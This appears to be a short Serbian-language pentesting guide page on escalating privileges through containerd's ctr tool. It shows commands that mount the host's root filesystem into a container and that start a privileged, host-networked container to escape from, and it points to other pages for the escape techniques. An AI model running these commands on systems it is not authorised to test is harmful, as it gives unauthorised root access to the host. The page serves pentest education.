# Containerd (ctr) eskalacija privilegija

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

Idite na sledeći link da saznate **šta je containerd** i `ctr`:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

ako otkrijete da host sadrži komandu `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Možete navesti slike:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
I zatim **pokrenite jednu od tih slika montirajući host root folder na nju**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Pokrenite privilegovani kontejner i pobegnite iz njega.\
Možete pokrenuti privilegovani kontejner kao:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Zatim možete koristiti neke od tehnika pomenutih na sledećoj stranici da **pobegnete iz nje zloupotrebljavajući privilegovane sposobnosti**:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
